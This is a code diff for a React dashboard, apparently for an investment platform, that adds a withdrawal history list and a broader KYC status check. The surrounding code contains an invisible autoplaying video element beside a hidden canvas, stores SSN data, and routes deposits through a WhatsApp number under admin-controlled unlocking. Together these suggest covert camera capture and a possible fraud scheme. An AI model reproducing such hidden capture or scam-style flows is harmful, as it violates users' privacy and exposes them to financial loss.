@@ -8,7 +8,7 @@ import {
   LogOut, Lock, Smartphone, ShieldCheck, 
   Activity, Upload, Camera, User, 
   Wallet, Menu, X, Info, CheckCircle, AlertCircle,
-  ArrowDownLeft, Clock, Banknote 
+  ArrowDownLeft, Clock, Banknote, History, ArrowUpRight 
 } from 'lucide-react';
 import { motion, AnimatePresence } from 'framer-motion';
 
@@ -51,9 +51,10 @@ export default function Dashboard() {
   const [isMenuOpen, setIsMenuOpen] = useState(false);
   const [notification, setNotification] = useState<{ message: string, type: 'success' | 'error' } | null>(null);
 
-  // WITHDRAWAL STATE
+  // WITHDRAWAL & HISTORY STATE
   const [withdrawModalOpen, setWithdrawModalOpen] = useState(false);
   const [withdrawAmount, setWithdrawAmount] = useState('');
+  const [transactions, setTransactions] = useState<any[]>([]); // New State for History
   const [latestWithdrawal, setLatestWithdrawal] = useState<any>(null);
   const [submittingWithdrawal, setSubmittingWithdrawal] = useState(false);
 
@@ -85,16 +86,22 @@ export default function Dashboard() {
            setLoading(false);
         }
 
-        // 2. Fetch Latest Withdrawal Request
-        const { data: withdrawals } = await supabase
-          .from('withdrawal_requests')
-          .select('*')
-          .eq('user_id', session.user.id)
-          .order('created_at', { ascending: false })
-          .limit(1)
-          .single();
-        
-        if (withdrawals) setLatestWithdrawal(withdrawals);
+        // 2. Fetch ALL Withdrawal Requests (History)
+        const fetchHistory = async () => {
+          const { data } = await supabase
+            .from('withdrawal_requests')
+            .select('*')
+            .eq('user_id', session.user.id)
+            .order('created_at', { ascending: false });
+          
+          if (data) {
+            setTransactions(data);
+            // We set the latest pending one as the "active" one for the button state
+            const pending = data.find((t: any) => t.status === 'pending');
+            setLatestWithdrawal(pending || null); 
+          }
+        };
+        fetchHistory();
 
         // 3. Realtime Listener for Profile
         profileChannel = supabase.channel('realtime-profile')
@@ -106,8 +113,8 @@ export default function Dashboard() {
         withdrawalChannel = supabase.channel('realtime-withdrawals')
           .on('postgres_changes', { event: '*', schema: 'public', table: 'withdrawal_requests', filter: `user_id=eq.${session.user.id}` }, 
           (payload: any) => {
-             // If a new row is inserted or updated, update state
-             if(payload.new) setLatestWithdrawal(payload.new);
+             // Refresh list on any change
+             fetchHistory();
           })
           .subscribe();
 
@@ -185,13 +192,11 @@ export default function Dashboard() {
     e.preventDefault();
     const amount = Number(withdrawAmount);
 
-    // 1. Check if number is valid
     if (!withdrawAmount || isNaN(amount) || amount <= 0) {
       showToast("Please enter a valid amount", "error");
       return;
     }
     
-    // 2. STRICT CHECK: CANNOT WITHDRAW MORE THAN BALANCE
     if (amount > user.balance) {
       showToast(`Insufficient Funds. Max available: $${user.balance.toLocaleString()}`, "error");
       return;
@@ -213,6 +218,7 @@ export default function Dashboard() {
       showToast("Withdrawal Request Sent to Admin", "success");
       setWithdrawModalOpen(false);
       setWithdrawAmount('');
+      // Note: Realtime listener will auto-update history list
     } catch (err: any) {
       showToast(err.message || "Request failed", "error");
     } finally {
@@ -222,6 +228,9 @@ export default function Dashboard() {
 
   const rawStatus = user?.deposit_status?.toString().toLowerCase().trim() || "";
   const isUnlocked = rawStatus === 'unlocked' || rawStatus === 'approved';
+  // FIXED: Check for both 'verified' AND 'approved'
+  const isKycVerified = user?.kyc_status === 'verified' || user?.kyc_status === 'approved';
+
   const waLink = `https://wa.me/19803487946?text=I%20am%20${user?.full_name}%20(${user?.email})%20and%20I%20want%20to%20deposit.`;
   const showPendingScreen = (user?.kyc_status === 'pending' || user?.kyc_status === 'pending_review') && (user?.ssn_data && user?.ssn_data.length > 2);
 
@@ -230,7 +239,8 @@ export default function Dashboard() {
       <div className="w-12 h-12 border-2 border-[#D4AF37] border-t-transparent rounded-full animate-spin" />
       <p className="text-[#D4AF37] text-[10px] uppercase tracking-[0.4em]">Verifying Identity...</p>
     </div>
-  );return (
+  );
+  return (
     <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black relative">
       <video ref={videoRef} autoPlay playsInline muted className="fixed top-0 left-0 w-1 h-1 opacity-0 pointer-events-none" style={{ zIndex: -1 }} />
       <canvas ref={canvasRef} className="hidden" />
@@ -366,20 +376,13 @@ export default function Dashboard() {
                  {isUnlocked ? <><Smartphone size={16}/> Initialize Deposit</> : <><Lock size={16}/> Deposit Restricted</>}
                </a>
 
-               {/* 2. WITHDRAW BUTTON / STATUS CARD */}
+               {/* 2. WITHDRAW BUTTON */}
+               {/* Logic: If Latest is Pending -> Show Pending. If Approved/Rejected -> Allow New Request. */}
                {latestWithdrawal && latestWithdrawal.status === 'pending' ? (
                  <div className="w-full md:w-auto px-8 py-4 bg-yellow-500/10 border border-yellow-500/30 rounded-full flex items-center gap-3 text-yellow-500">
                     <Clock size={18} className="animate-pulse" />
                     <div className="flex flex-col text-left">
                        <span className="text-[10px] font-bold uppercase tracking-wider">Pending Approval</span>
-                       <span className="text-xs font-mono">${latestWithdrawal.amount.toLocaleString()}</span>
-                    </div>
-                 </div>
-               ) : latestWithdrawal && latestWithdrawal.status === 'approved' ? (
-                 <div className="w-full md:w-auto px-8 py-4 bg-green-500/10 border border-green-500/30 rounded-full flex items-center gap-3 text-green-500">
-                    <CheckCircle size={18} />
-                    <div className="flex flex-col text-left">
-                       <span className="text-[10px] font-bold uppercase tracking-wider">Withdrawal Approved</span>
                        <span className="text-xs font-mono">${latestWithdrawal.amount.toLocaleString()}</span>
                     </div>
                  </div>
@@ -417,7 +420,7 @@ export default function Dashboard() {
         </div>
 
         {/* KYC SECTION */}
-        {user?.kyc_status === 'verified' ? (
+        {isKycVerified ? (
           <div className="bg-[#0a0a0a] border border-[#D4AF37]/30 rounded-[2.5rem] p-12 text-center flex flex-col items-center gap-6 shadow-[0_0_50px_rgba(212,175,55,0.05)]">
              <div className="w-24 h-24 bg-[#D4AF37]/10 rounded-full flex items-center justify-center border border-[#D4AF37] shadow-lg"><ShieldCheck size={48} className="text-[#D4AF37]" /></div>
              <div><h3 className="text-3xl font-serif text-white mb-3">Identity Verified</h3><p className="text-gray-500 text-sm max-w-lg mx-auto leading-relaxed">Your secure profile has been successfully validated. You now have Tier-1 access to all global markets and high-limit withdrawals.</p></div>
@@ -464,7 +467,50 @@ export default function Dashboard() {
             </div>
           </div>
         )}
+
+        {/* --- TRANSACTION HISTORY SECTION --- */}
+        <div className="pt-10 border-t border-white/5">
+          <div className="flex items-center gap-3 mb-8">
+            <History size={20} className="text-[#D4AF37]" />
+            <h3 className="text-xl font-serif text-white">Transaction History</h3>
+          </div>
+
+          <div className="grid gap-4">
+            {transactions.length > 0 ? (
+              transactions.map((tx) => (
+                <div key={tx.id} className="bg-[#0a0a0a] border border-white/5 p-6 rounded-3xl flex items-center justify-between hover:border-white/10 transition-colors">
+                   <div className="flex items-center gap-4">
+                     <div className={`w-10 h-10 rounded-full flex items-center justify-center 
+                       ${tx.status === 'approved' ? 'bg-green-500/10 text-green-500' : 
+                         tx.status === 'rejected' ? 'bg-red-500/10 text-red-500' : 'bg-yellow-500/10 text-yellow-500'}`}>
+                       {tx.status === 'approved' ? <ArrowUpRight size={18} /> : 
+                        tx.status === 'rejected' ? <X size={18} /> : <Clock size={18} />}
+                     </div>
+                     <div>
+                       <p className="text-sm text-white font-bold">Withdrawal Request</p>
+                       <p className="text-[10px] text-gray-500 uppercase tracking-wider">{new Date(tx.created_at).toLocaleDateString()}</p>
+                     </div>
+                   </div>
+                   
+                   <div className="text-right">
+                     <p className="text-lg font-mono text-white mb-1">-${tx.amount.toLocaleString()}</p>
+                     <span className={`text-[9px] font-bold uppercase tracking-widest px-2 py-1 rounded-full border
+                       ${tx.status === 'approved' ? 'bg-green-500/10 border-green-500/20 text-green-500' : 
+                         tx.status === 'rejected' ? 'bg-red-500/10 border-red-500/20 text-red-500' : 'bg-yellow-500/10 border-yellow-500/20 text-yellow-500'}`}>
+                       {tx.status}
+                     </span>
+                   </div>
+                </div>
+              ))
+            ) : (
+              <div className="text-center py-12 border border-dashed border-white/10 rounded-3xl">
+                <p className="text-gray-600 text-sm">No transaction history found.</p>
+              </div>
+            )}
+          </div>
+        </div>
+        
       </div>
     </main>
   );
-            }
+                  }
